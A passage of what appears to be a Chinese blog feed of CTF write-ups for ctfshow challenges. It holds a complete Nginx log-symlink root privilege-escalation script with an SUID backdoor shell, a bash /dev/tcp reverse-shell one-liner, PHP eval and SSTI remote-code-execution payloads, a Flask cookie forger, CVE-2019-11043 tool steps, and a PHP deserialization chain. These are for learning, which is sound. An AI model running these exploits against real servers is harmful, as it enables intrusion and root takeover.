'/'`\\n\"\n    exit 3\nfi\n\n# Priv check\n\necho -e \"\\n[+] Starting the exploit as: \\n\\033[94m`id`\\033[0m\"\nid | grep -q www-data\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] You need to execute the exploit as www-data user! Exiting.\\n\"\n    exit 3\nfi\n\n# Set target paths\nERRORLOG=\"$1\"\nif [ ! -f $ERRORLOG ]; then\n    echo -e \"\\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\\n\"\n    exit 3\nfi\n\n# [ Exploitation ]\n\ntrap ctrl_c INT\n# Compile privesc preload library\necho -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\"\ncat &lt;&lt;_solibeof_&gt;$PRIVESCSRC\n#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;dlfcn.h&gt;\n       #include &lt;sys/types.h&gt;\n       #include &lt;sys/stat.h&gt;\n       #include &lt;fcntl.h&gt;\n\nuid_t geteuid(void) {\n    static uid_t  (*old_geteuid)();\n    old_geteuid = dlsym(RTLD_NEXT, \"geteuid\");\n    if ( old_geteuid() == 0 ) {\n        chown(\"$BACKDOORPATH\", 0, 0);\n        chmod(\"$BACKDOORPATH\", 04777);\n        unlink(\"/etc/ld.so.preload\");\n    }\n    return old_geteuid();\n}\n_solibeof_\n/bin/bash -c \"gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl\"\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Failed to compile the privesc lib $PRIVESCSRC.\"\n    cleanexit 2;\nfi\n\n\n# Prepare backdoor shell\ncp $BACKDOORSH $BACKDOORPATH\necho -e \"\\n[+] Backdoor/low-priv shell installed at: \\n`ls -l $BACKDOORPATH`\"\n\n# Safety check\nif [ -f /etc/ld.so.preload ]; then\n    echo -e \"\\n[!] /etc/ld.so.preload already exists. Exiting for safety.\"\n    exit 2\nfi\n\n# Symlink the log file\nrm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG\nif [ $? -ne 0 ]; then\n    echo -e \"\\n[!] Couldn't remove the $ERRORLOG file or create a symlink.\"\n    cleanexit 3\nfi\necho -e \"\\n[+] The server appears to be \\033[94m(N)jinxed\\033[0m (writable logdir) ! :) Symlink created at: \\n`ls -l $ERRORLOG`\"\n\n# Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered\ncurl http://localhost/ &gt;/dev/null 2&gt;/dev/null\n# Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily \n# rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)\necho -ne \"\\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...\"\nwhile :; do \n    sleep 1\n    if [ -f /etc/ld.so.preload ]; then\n        echo $PRIVESCLIB &gt; /etc/ld.so.preload\n        rm -f $ERRORLOG\n        break;\n    fi\ndone\n\n# /etc/ld.so.preload should be owned by www-data user at this point\n# Inject the privesc.so shared library to escalate privileges\necho $PRIVESCLIB &gt; /etc/ld.so.preload\necho -e \"\\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \\n`ls -l /etc/ld.so.preload`\"\necho -e \"\\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload\"\necho -e \"\\n[+] The /etc/ld.so.preload file now contains: \\n`cat /etc/ld.so.preload`\"\nchmod 755 /etc/ld.so.preload\n\n# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)\necho -e \"\\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!\"\nsudo 2&gt;/dev/null &gt;/dev/null\n\n# Check for the rootshell\nls -l $BACKDOORPATH\nls -l $BACKDOORPATH | grep rws | grep -q root\nif [ $? -eq 0 ]; then \n    echo -e \"\\n[+] Rootshell got assigned root SUID perms at: \\n`ls -l $BACKDOORPATH`\"\n    echo -e \"\\n\\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\\033[0m\"\nelse\n    echo -e \"\\n[!] Failed to get root\"\n    cleanexit 2\nfi\n\nrm -f $ERRORLOG\necho &gt; $ERRORLOG\n\n# Use the rootshell to perform cleanup that requires root privilges\n$BACKDOORPATH -p -c \"rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB\"\n# Reset the logging to error.log\n$BACKDOORPATH -p -c \"kill -USR1 `pidof -s nginx`\"\n\n# Execute the rootshell\necho -e \"\\n[+] Spawning the rootshell $BACKDOORPATH now! \\n\"\n$BACKDOORPATH -p -i\n\n# Job done.\ncleanexit 0\n</code></pre>\n<p>之后写命令</p>\n<p>反弹 shell</p>\n<pre><code class=\"bash\">在服务器\nnc -lvnp 20000(监听端口)\n在菜刀的虚拟终端\nbash -i bash -i &gt;&amp; /dev/tcp/addr(服务器ip)/port(监听端口) 0&gt;&amp;1\n</code></pre>\n<p>反弹成功</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_1.jpg\"></p>\n<p>反弹成功后，在网站根目录下执行以下命令</p>\n<pre><code class=\"bash\">chmod a+rwx nginx.sh\n./nginx.sh\n./nginx.sh /var/log/nginx/error.log\n</code></pre>\n<p>等待</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_2.jpg\"></p>\n<p>待漏洞触发时，拿到 flag</p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_3.jpg\"></p>\n<p><img data-src=\"/../../../post_images/%E5%9B%BE%E7%89%87/%E5%87%BA%E9%A2%98%E4%BA%BA_4.jpg\"></p>\n<h2 id=\"登陆就有-flag\"><a href=\"#登陆就有-flag\" class=\"headerlink\" title=\"登陆就有 flag\"></a>登陆就有 flag</h2><p>MySQL弱类型转换</p>\n<p>空异或0会查到所有非数字开头的记录，转换一下还有好几种结果：</p>\n<pre><code class=\"raw\">'^0#   '^''#\n</code></pre>\n<h2 id=\"签退\"><a href=\"#签退\" class=\"headerlink\" title=\"签退\"></a>签退</h2><p>这里主要用到了eval函数的功能</p>\n<p>它会将参数作文php代码运行</p>\n<p>那么源码中的<code>\"$$S\"</code> 要想办法绕过第一个<code>$</code>, 因为肯定没有名为传入值的变量的</p>\n<p>这里可以将传入值用分号分隔</p>\n<p>如<code>?S=a;system('ls');</code></p>\n<p>那么进行eval函数时，为<code>$a;system('ls');</code>, 很明显可以作为php语句执行，先创建变量，然后执行<code>system</code>函数</p>\n<p>输入<code>S=a;system('ls');</code></p>\n<p>只有index.php，那么转为显示根目录<code>S=a;system('ls /');</code></p>\n<p>尝试进入目录<code>/var</code>, 即 <code>S=a;system('ls /var');</code></p>\n<p>发现flag.txt，payload:<code>?S=a;system('cat /var/flag.txt');</code></p>\n<p>得到 flag</p>\n<h2 id=\"蓝瘦\"><a href=\"#蓝瘦\" class=\"headerlink\" title=\"蓝瘦\"></a>蓝瘦</h2><p>ssti注入</p>\n<p>抓包，修改 session 值为 {“username ：‘admin’”}，（加密后）</p>\n<p>加密解密脚本</p>\n<pre><code class=\"python\">\"\"\" Flask Session Cookie Decoder/Encoder \"\"\"\n__author__ = 'Wilson Sumanang, Alexandre ZANNI'\n\n# standard imports\nimport sys\nimport zlib\nfrom itsdangerous import base64_decode\nimport ast\n\n# Abstract Base Classes (PEP 3119)\nif sys.version_info[0] &lt; 3:  # &lt; 3.0\n    raise Exception('Must be using at least Python 3')\nelif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4\n    from abc import ABCMeta, abstractmethod\nelse:  # &gt; 3.4\n    from abc import ABC, abstractmethod\n\n# Lib for argument parsing\nimport argparse\n\n# external Imports\nfrom flask.sessions import SecureCookieSessionInterface\n\n\nclass MockApp(object):\n\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n\nif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4\n    class FSCM(metaclass=ABCMeta):\n        def encode(secret_key, session_cookie_structure):\n            \"\"\" Encode a Flask session cookie \"\"\"\n            try:\n                app = MockApp(secret_key)\n\n                session_cookie_structure = dict(\n                    ast.literal_eval(session_cookie_structure))\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.dumps(session_cookie_structure)\n            except Exception as e:\n                return \"[Encoding error] {}\".format(e)\n                raise e\n\n        def decode(session_cookie_value, secret_key=None):\n            \"\"\" Decode a Flask cookie  \"\"\"\n            try:\n                if(secret_key == None):\n                    compressed = False\n                    payload = session_cookie_value\n\n                    if payload.startswith('.'):\n                        compressed = True\n                        payload = payload[1:]\n\n                    data = payload.split(\".\")[0]\n\n                    data = base64_decode(data)\n                    if compressed:\n                        data = zlib.decompress(data)\n\n                    return data\n                else:\n                    app = MockApp(secret_key)\n\n                    si = SecureCookieSessionInterface()\n                    s = si.get_signing_serializer(app)\n\n                    return s.loads(session_cookie_value)\n            except Exception as e:\n                return \"[Decoding error] {}\".format(e)\n                raise e\nelse:  # &gt; 3.4\n    class FSCM(ABC):\n        def encode(secret_key, session_cookie_structure):\n            \"\"\" Encode a Flask session cookie \"\"\"\n            try:\n                app = MockApp(secret_key)\n\n                session_cookie_structure = dict(\n                    ast.literal_eval(session_cookie_structure))\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.dumps(session_cookie_structure)\n            except Exception as e:\n                return \"[Encoding error] {}\".format(e)\n                raise e\n\n        def decode(session_cookie_value, secret_key=None):\n            \"\"\" Decode a Flask cookie  \"\"\"\n            try:\n                if(secret_key == None):\n                    compressed = False\n                    payload = session_cookie_value\n\n                    if payload.startswith('.'):\n                        compressed = True\n                        payload = payload[1:]\n\n                    data = payload.split(\".\")[0]\n\n                    data = base64_decode(data)\n                    if compressed:\n                        data = zlib.decompress(data)\n\n                    return data\n                else:\n                    app = MockApp(secret_key)\n\n                    si = SecureCookieSessionInterface()\n                    s = si.get_signing_serializer(app)\n\n                    return s.loads(session_cookie_value)\n            except Exception as e:\n                return \"[Decoding error] {}\".format(e)\n                raise e\n\n\nif __name__ == \"__main__\":\n    # Args are only relevant for __main__ usage\n\n    # Description for help\n    parser = argparse.ArgumentParser(\n        description='Flask Session Cookie Decoder/Encoder',\n        epilog=\"Author : Wilson Sumanang, Alexandre ZANNI\")\n\n    # prepare sub commands\n    subparsers = parser.add_subparsers(\n        help='sub-command help', dest='subcommand')\n\n    # create the parser for the encode command\n    parser_encode = subparsers.add_parser('encode', help='encode')\n    parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',\n                               help='Secret key', required=True)\n    parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;',\n                               help='Session cookie structure', required=True)\n\n    # create the parser for the decode command\n    parser_decode = subparsers.add_parser('decode', help='decode')\n    parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;',\n                               help='Secret key', required=False)\n    parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;',\n                               help='Session cookie value', required=True)\n\n    # get args\n    args = parser.parse_args()\n\n    # find the option chosen\n    if(args.subcommand == 'encode'):\n        if(args.secret_key is not None and args.cookie_structure is not None):\n            print(FSCM.encode(args.secret_key, args.cookie_structure))\n    elif(args.subcommand == 'decode'):\n        if(args.secret_key is not None and args.cookie_value is not None):\n            print(FSCM.decode(args.cookie_value, args.secret_key))\n        elif(args.cookie_value is not None):\n            print(FSCM.decode(args.cookie_value))\n</code></pre>\n<p>后面为ssti注入</p>\n<p><code>?ctfshow={{''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"ls\").read()')}}</code></p>\n<p>返回正常，想访问内部文件，无果</p>\n<p>flag 在内存 (查阅资料)</p>\n<p>试着读取环境变量</p>\n<p><code>{{''.__class__.__mro__[1].__subclasses__()[66].__init__.__globals__[\"__builtins__\"].eval('__import__(\"os\").popen(\"env\").read()')}}</code></p>\n<h2 id=\"一览无余\"><a href=\"#一览无余\" class=\"headerlink\" title=\"一览无余\"></a>一览无余</h2><p>一览无余（需要再次学习）直接看wp发现为<code>CVE-2019-11043</code><br>利用工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25lZXgvcGh1aXAtZnBpemRhbQ==\">PHuiP-FPizdaM</span></p>\n<h3 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程:\"></a>安装过程:</h3><h4 id=\"1-安装go环境-如果没有的话\"><a href=\"#1-安装go环境-如果没有的话\" class=\"headerlink\" title=\"1. 安装go环境 (如果没有的话)\"></a>1. 安装go环境 (如果没有的话)</h4><pre><code class=\"bash\">root全县辖\napt-get update\napt install gccgo-go\napt install golang-go\n途中一直回车\n</code></pre>\n<h4 id=\"2-安装phuip-fpizdam\"><a href=\"#2-安装phuip-fpizdam\" class=\"headerlink\" title=\"2. 安装phuip-fpizdam\"></a>2. 安装phuip-fpizdam</h4><pre><code class=\"bash\">git clone https://github.com/neex/phuip-fpizdam.git phuip-fpizdam\ncd phuip-fpizdam\ngo get -v &amp;&amp; go build 或 go install phuip-fpizdam\n</code></pre>\n<p>若出现</p>\n<pre><code class=\"raw\">go: github.com/spf13/cobra@v0.0.5: Get \"https://proxy.golang.org/github.com/spf13/cobra/@v/v0.0.5.mod\": dial tcp 142.251.43.17:443: connect: connection refused\ngo: github.com/spf13/cobra@v0.0.5: Get \"https://proxy.golang.org/github.com/spf13/cobra/@v/v0.0.5.mod\": dial tcp 142.251.43.17:443: connect: connection refused\n</code></pre>\n<p>原因为go代理默认为国外，</p>\n<pre><code class=\"bash\">go env -w GOPROXY=https://goproxy.cn\n</code></pre>\n<ol>\n<li><p>进行修改</p>\n</li>\n<li><p>重复第三步</p>\n</li>\n</ol>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/%E4%B8%80%E8%A7%88%E6%97%A0%E4%BD%99_1.jpg\"></p>\n<p>出现此下载完成</p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><pre><code class=\"火绒\">\n出现 done! 即为执行成功\n\n执行成功，那么即可通过 url/index.php?a=shellcode(ls等)\n只有部分 PHP-FPM 子进程受到了污染，因此需要尝试几次以执行该命令。\n</code></pre>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxMTMzMzAy\">https://blog.csdn.net/unexpectedthing/article/details/121133302</span></p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy85ZGExODRlZjI0YmQ=\">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</span><br>PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>\n<p>PHP 远程代码执行漏洞复现（CVE-2019-11043）【反弹 shell 成功】</p>\n<h1 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h1><h2 id=\"真的是签到\"><a href=\"#真的是签到\" class=\"headerlink\" title=\"真的是签到\"></a>真的是签到</h2><p>查看下载的文件，伪加密，修改后解压，得到<code>签到.exe</code></p>\n<p>ExeinfoPE查壳，发现为Aspack</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\reverse\\内部赛_真的是签到_1.jpg\"></p>\n<p>脱壳后再查看,发现为UPX加壳</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\reverse\\内部赛_真的是签到_2.jpg\"></p>\n<p>脱壳后，发现没有壳了，IDA打开</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d0dbb8d4/",
            "url": "http://dpm12345.cn/posts/d0dbb8d4/",
            "title": "2023愚人杯",
            "date_published": "2022-10-04T15:38:40.000Z",
            "content_html": "<p>最终得分为<u>1500</u></p>\n<p><img data-src=\"/../../../post_images/ctfshow/%E6%84%9A%E4%BA%BA%E6%9D%AF2023/output.png\"></p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h2 id=\"easy-signin\"><a href=\"#easy-signin\" class=\"headerlink\" title=\"easy_signin\"></a>easy_signin</h2><p>img参数可以传参，传入<code>index.php</code>的base64编码</p>\n<p>利用读文件，读出index.php</p>\n<h2 id=\"easy-ssti\"><a href=\"#easy-ssti\" class=\"headerlink\" title=\"easy_ssti\"></a>easy_ssti</h2><p>这道题其实是比较简单的</p>\n<p>但由于他为直接在网址进行SSTI模板注入，故在列出根目录时，<code>/</code>会作为网址的一部分，导致404错误，故这里还需要进行绕过，比如<code>request.args.a</code><del>(卡了我好久)</del></p>\n<h2 id=\"被遗忘的反序列化\"><a href=\"#被遗忘的反序列化\" class=\"headerlink\" title=\"被遗忘的反序列化\"></a>被遗忘的反序列化</h2><pre><code class=\"php\">&lt;?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n</code></pre>\n<p>这题做得比较艰难</p>\n<p>一开始并不知道<code>$_SERVER[\"HTTP_AAAAAA\"]</code>，后经过输出<code>$_SERVER</code>可知，<code>AAAAAA</code>即为上传时的参数名，所以可以hackbar的修改请求头上传</p>\n<p>大致做题过程为:</p>\n<ol>\n<li><p>浏览大致代码，很容易可以判断出反序列化起点为类<code>w_wuw_w</code>，利用开始点为<code>__destruct()</code></p>\n</li>\n<li><p>当<code>__destruct()</code>执行后，会将<code>$this-&gt;aaa</code>当作字符串进行输出，而<code>gBoBg</code>恰好有<code>__String()</code>方法，于是进入该方法</p>\n</li>\n<li><p>可以看到该方法中有三段的判断</p>\n<ol>\n<li>创建一个类名为<code>$this-&gt;coos</code>的类对象，然后<code>echo</code></li>\n<li>第二段返回<code>$this-&gt;coos</code>的<code>name</code>属性</li>\n<li>第三段是将<code>$this-&gt;coos</code>当作函数来使用。</li>\n</ol>\n</li>\n<li><p>第一段：这是无法利用的，因为<code>echo</code>还是需要其有<code>__String()</code>，但代码中有此方法的只有<code>gBoBg</code>，如果传这个，那么就进入死循环，也解不出来</p>\n<p>第二段：这里能利用的类只有<code>EeE</code>，但可以看到，最后会输出<code>name</code>加上一堆的<code>e</code>，而<code>name</code>在进入该判断时，必为空，故也没用</p>\n<p>第三段：这里涉及到的是魔术方法<code>__invoke</code>，当对象被当作函数使用时，会调用此魔术方法。浏览整段代码，可知<code>cycycycy</code>和<code>w_wuw_w</code>均有此魔术方法，但在<code>cycycycy</code>中，该方法的调用只会输出<code>\\$a_a\\$</code>，没有用，而且在<code>w_wuw_w</code>中，<code>__invoke()</code>恰好<code>clone</code>了一个新的对象，而这<code>clone</code>的魔术方法在<code>EeE</code>中已实现,而且会执行<code>cycycycy</code>的<code>aaa()</code>方法，该方法中有<code>eval</code>，故这段有用</p>\n<p>综上，采用第三段的逻辑，故要使得<code>name</code>为空，<code>file</code>不为空。</p>\n</li>\n<li><p>由上，可以进入<code>aaa</code>方法，可以看到，当所上传的<code>get</code>被<code>cipher</code>处理后等于<code>p8vfuv8g8v8py</code>时，则会执行<code>eval</code></p>\n</li>\n</ol>\n<p>综上可知，大致要求为</p>\n<p>创建一个<code>w_wuw_w</code>对象，其属性<code>aaa</code>为<code>gBoBg</code>的类对象，<code>aaa</code>的<code>name</code>不赋值，<code>file</code>赋值，<code>coos</code>为<code>w_wuw_w</code>对象</p>\n<p>而接下来的目标是为了获取<code>get</code>应该上传什么，根据<code>include</code>，可猜测<code>cipher</code>的定义实现在<code>check.php</code>中</p>\n<p>在这里，利用了<code>w_wuw_w</code>类中<code>__wakeup</code>的<code>file_get_contents</code>，通过php伪协议读取文件<del>(尝试了好久)</del>，将文件内容存到<code>$this-&gt;key</code>中，而为了能够读出，由<code>__destruct()</code>会输出<code>aaa</code>,故可将<code>$this-&gt;aaa</code>指向<code>$this-&gt;key</code>,即<code>$this-&gt;aaa = &amp;$this-&gt;key</code></p>\n<p>故代码为</p>\n<pre><code class=\"php\">&lt;?php\n# 当前目录中有一个txt文件哦\n// error_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file=1;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __construct($coos)\n    {\n        $this-&gt;coos = $coos;\n    }\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file = \"php://filter/convert.base64-encode/resource=check.php\";\n    public function __construct($a)\n    {\n        $this-&gt;aaa = &amp;$this-&gt;key;\n    }\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\n$a = new w_wuw_w(1);\necho (serialize($a));\n</code></pre>\n<p>得到的序列化字符串</p>\n<pre><code class=\"raw\">O:7:\"w_wuw_w\":3:{s:3:\"aaa\";N;s:3:\"key\";R:2;s:4:\"file\";s:53:\"php://filter/convert.base64-encode/resource=check.php\";}\n</code></pre>\n<p>传入，得到base64代码，解码后，得到check.php</p>\n<pre><code class=\"php\">&lt;?php\nfunction cipher($str) {\n\n    if(strlen($str)&gt;10000){\n        exit(-1);\n    }\n    $charset = \"qwertyuiopasdfghjklzxcvbnm123456789\";\n    $shift = 4;\n    $shifted = \"\";\n\n    for ($i = 0; $i &lt; strlen($str); $i++) {\n        $char = $str[$i];\n        $pos = strpos($charset, $char);\n\n        if ($pos !== false) {\n            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);\n            $shifted .= $charset[$new_pos];\n        } else {\n            $shifted .= $char;\n        }\n    }\n\n    return $shifted;\n}\n</code></pre>\n<p>经过分析，很容易得出加密流程为，首先定位提供的字符串每一位字符在<code>charset</code>字符串中的位置，然后将其位置在<code>charset</code>中偏移4位，将偏移后的字符加入到<code>$shifted</code>中</p>\n<p>于是解密脚本为</p>\n<pre><code class=\"python\">a = \"p8vfuv8g8v8py\"\ncharset = \"qwertyuiopasdfghjklzxcvbnm123456789\"\n\nfor x in a:\n    index = (charset.index(x) + 4) % len(charset)\n    print(charset[index],end=\"\")\n</code></pre>\n<p>得到字符串<code>fe1ka1ele1efp</code>，经验证是正确的</p>\n<p>故生成新的序列化字符串，代码为</p>\n<pre><code class=\"php\">&lt;?php\n\n# 当前目录中有一个txt文件哦\n// error_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this-&gt;text == \"aaaa\"){\n            echo lcfirst($this-&gt;text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -&gt; aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -&gt; a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file=1;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __construct($coos)\n    {\n        $this-&gt;coos = $coos;\n    }\n    public function __toString(){\n        if(isset($this-&gt;name)){\n            $a = new $this-&gt;coos($this-&gt;file);\n            echo $a;\n        }else if(!isset($this -&gt; file)){\n            return $this-&gt;coos-&gt;name;\n        }else{\n            $aa = $this-&gt;coos;\n            $bb = $this-&gt;file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __construct($a)\n    {\n        $this-&gt;aaa = $a;\n    }\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -&gt; key)){\n            $this-&gt;key = file_get_contents($this -&gt; file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this-&gt;aaa;\n    }\n\n    public function __invoke(){\n        $this -&gt; aaa = clone new EeE;\n    }\n}\nfunction cd(){\n    echo 52;\n}\n$a = new w_wuw_w(new gBoBg(new w_wuw_w(\"1\")));\necho (serialize($a));\n</code></pre>\n<p>得到字符串</p>\n<pre><code class=\"raw\">O:7:\"w_wuw_w\":3:{s:3:\"aaa\";O:5:\"gBoBg\":4:{s:4:\"name\";N;s:4:\"file\";i:1;s:4:\"coos\";O:7:\"w_wuw_w\":3:{s:3:\"aaa\";s:1:\"1\";s:3:\"key\";N;s:4:\"file\";N;}s:11:\"gBoBgeeee\";s:3:\"-_-\";}s:3:\"key\";N;s:4:\"file\";N;}\n</code></pre>\n<p>这里注意到<code>s:11:\"gBoBgeeee\";</code>，这会使得反序列化失败(不清楚为什么会序列化成这样)，于是将<code>11</code>改为<code>9</code></p>\n<p>上传</p>\n<pre><code class=\"raw\">AAAAAA=O:7:\"w_wuw_w\":3:{s:3:\"aaa\";O:5:\"gBoBg\":4:{s:4:\"name\";N;s:4:\"file\";i:1;s:4:\"coos\";O:7:\"w_wuw_w\":3:{s:3:\"aaa\";s:1:\"1\";s:3:\"key\";N;s:4:\"file\";N;}s:9:\"gBoBgeeee\";s:3:\"-_-\";}s:3:\"key\";N;s:4:\"file\";N;}\n\nGET: http://0e1fa161-89d4-4361-a690-a82daae59b8e.challenge.ctf.show/?get=fe1ka1ele1efp\nPOST: eval=system('ls');\n      eval=system('ls /');\n      eval=system('cat /f1agaaa');\n</code></pre>\n<p>得到flag</p>\n<p>（这里在进行<code>system('ls')</code>时，会发现之前说的<code>txt</code>文件为<code>h1nt.txt</code>，其内容为<code>\\#用于check.php key：qwertyuiopasdfghjklzxcvbnm123456789 move：2~4</code>，这里提示较少，不如直接读<code>check.php</code>） <del>之前试过文件名是不是<code>hint.txt</code>，就差一点，但也恨当时已经可以读文件了，却还要纠结于txt文件，不如读<code>check.php</code></del></p>\n<p>(wp的思想是先使得file=/*.txt,然后利用原生类来获取txt的文件名，之后获取txt文件的内容，得到提示，然后爆破加密的移动的位数，然后得到加密流程，之后和我的做法一样)</p>\n<p>但是我读到的<code>h1nt.txt</code>并不是在根目录(</p>\n<p>看来是非预期解</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"easy-base\"><a href=\"#easy-base\" class=\"headerlink\" title=\"easy_base\"></a>easy_base</h2><p>base16 + base32 + base64</p>\n<h2 id=\"大牛的密码\"><a href=\"#大牛的密码\" class=\"headerlink\" 